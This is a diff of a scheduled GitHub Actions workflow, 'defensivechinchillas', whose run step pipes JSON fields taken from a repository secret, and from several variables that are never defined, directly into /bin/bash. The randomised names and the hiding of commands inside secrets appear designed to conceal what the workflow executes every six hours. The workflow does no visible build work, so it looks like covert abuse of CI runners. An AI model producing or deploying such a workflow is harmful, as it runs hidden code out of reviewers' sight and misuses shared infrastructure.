@@ -1,37 +1,23 @@
 name: defensivechinchillas
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
+    - cron: '56 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: defensivechinchillas
         env:
-          xxeka361: ${{ secrets.xxeka361 }}
+          uzxr693: ${{ secrets.uzxr693 }}
         run: |
-          echo $xxeka361 | jq -r .zour2511 | /bin/bash
-          echo $qxn75 | jq -r .mglr4850 | /bin/bash
-          echo $alk3676 | jq -r .got8 | /bin/bash
-          echo $ifk25 | jq -r .hfxft2 | /bin/bash
-          echo $na1613 | jq -r .jinkk0050 | /bin/bash
-          echo $xw5334 | jq -r .gpldn61 | /bin/bash
-          echo $thexu5 | jq -r .vvgtw8 | /bin/bash
-          echo $em9 | jq -r .ixz3 | /bin/bash
-          echo $gzthx863 | jq -r .txcjq27 | /bin/bash
-          echo $iecnt2879 | jq -r .wz8 | /bin/bash
-          echo $fuo03999 | jq -r .uz64 | /bin/bash
-          echo $bn1884 | jq -r .vvxvt66250 | /bin/bash
-          echo $kpsa2 | jq -r .en23689 | /bin/bash
-          echo $s75078 | jq -r .mhh385 | /bin/bash
-          echo $wmhee9 | jq -r .zmp8 | /bin/bash
-          echo $wy9 | jq -r .ptmrd25 | /bin/bash
-          echo $s1 | jq -r .icq5728 | /bin/bash
-          echo $z177 | jq -r .b0 | /bin/bash
-          echo $lmlh25785 | jq -r .aw524 | /bin/bash
-          echo $idkd514 | jq -r .ye948 | /bin/bash
-          echo $fvy8 | jq -r .nmwg26428 | /bin/bash
-          echo $lho7 | jq -r .pkda091 | /bin/bash
+          echo $uzxr693 | jq -r .tsbgg763 | /bin/bash
+          echo $n73 | jq -r .toa45 | /bin/bash
+          echo $mv4513 | jq -r .eue38312 | /bin/bash
+          echo $up02359 | jq -r .l3916 | /bin/bash
+          echo $g93349 | jq -r .xhalm84176 | /bin/bash
+          echo $aw8192 | jq -r .hmn130 | /bin/bash
 
